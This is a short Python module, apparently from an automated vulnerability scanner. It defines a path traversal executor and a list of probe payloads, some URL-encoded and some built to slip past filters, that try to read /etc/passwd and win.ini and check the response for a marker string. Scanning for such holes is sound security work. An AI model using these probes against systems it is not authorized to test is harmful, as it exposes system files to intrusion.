"""Path traversal executor — pipeline, kedalaman path dihitung dari URL."""

from __future__ import annotations

from wth_ai.executor.vuln.base import BaseVulnExecutor
from wth_ai.models import ExecutorResult, ExecutorTask

# Dipertahankan untuk import lama.
TRAVERSAL_PROBES: list[tuple[str, str, str]] = [
    ("../../../../etc/passwd", "root:x:0:0:", "linux_plain"),
    ("..%2F..%2F..%2F..%2Fetc%2Fpasswd", "root:x:0:0:", "linux_urlenc"),
    ("....//....//....//....//etc/passwd", "root:x:0:0:", "linux_filter_evade"),
    ("..\\..\\..\\..\\windows\\win.ini", "[fonts]", "win_plain"),
    ("..%5C..%5C..%5C..%5Cwindows%5Cwin.ini", "[fonts]", "win_urlenc"),
]


class PathTraversalExecutor(BaseVulnExecutor):
    vuln_type = "path_traversal"

    def execute(self, task: ExecutorTask) -> ExecutorResult:
        from wth_ai.pipeline.executor import execute_pipeline

        return execute_pipeline(self, task, "path_traversal")
